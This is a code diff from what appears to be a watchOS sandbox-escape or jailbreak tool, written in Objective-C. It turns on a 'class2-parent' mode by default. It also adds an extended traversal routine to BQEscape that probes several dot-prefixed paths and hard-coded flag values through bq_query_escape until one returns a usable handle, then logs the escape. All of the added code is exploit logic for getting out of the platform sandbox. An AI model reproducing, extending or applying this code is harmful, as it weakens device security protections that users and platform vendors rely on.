@@ -322,6 +322,10 @@ BOOL BQCoreInit(void) {
                                   withIntermediateDirectories:YES attributes:nil error:nil];
         if (gLogPath) [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
         NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
+        // watchOS 26.6.x adaptation: enable class2-parent unless the user explicitly disabled it.
+        if ([defs objectForKey:@"BQClass2ParentEnabled"] == nil) {
+            [defs setBool:YES forKey:@"BQClass2ParentEnabled"];
+        }
         gClass2ParentEnabled = [defs boolForKey:@"BQClass2ParentEnabled"];
         if (gClass2ParentEnabled && [defs boolForKey:@"BQClass2ParentCrashGuard"]) {
             gClass2ParentEnabled = NO;
@@ -654,6 +658,25 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
                 if (linkOut) *linkOut = p ?: target;
                 BQLog(@"escape: using bad_query traversal -> %@", p ?: target);
                 return h;
+            }
+            // watchOS 26.6.x extended traversal / flag probe
+            NSArray<NSNumber *> *extraDots = @[@6, @10, @12, @14];
+            uint64_t extraFlags[2] = { 0x8100000000ULL, 0x0800000000ULL };
+            for (NSNumber *dotCount in extraDots) {
+                NSString *altDomain = [bq_dots(dotCount.intValue) stringByAppendingString:target];
+                for (int fi = 0; fi < 2; fi++) {
+                    NSString *altPath = nil;
+                    int64_t altHandle = bq_query_escape(13, kMGGroup, YES, 3, altDomain, extraFlags[fi],
+                                                        [NSString stringWithFormat:@"class13-26x-d%d-f%d",
+                                                         dotCount.intValue, fi], &altPath);
+                    if (altHandle >= 0) {
+                        gTraversalState = 1;
+                        if (linkOut) *linkOut = altPath ?: target;
+                        BQLog(@"escape: using extended 26.x traversal (dots=%d flags=%#llx) -> %@",
+                              dotCount.intValue, extraFlags[fi], altPath ?: target);
+                        return altHandle;
+                    }
+                }
             }
         }
         gTraversalState = -1;
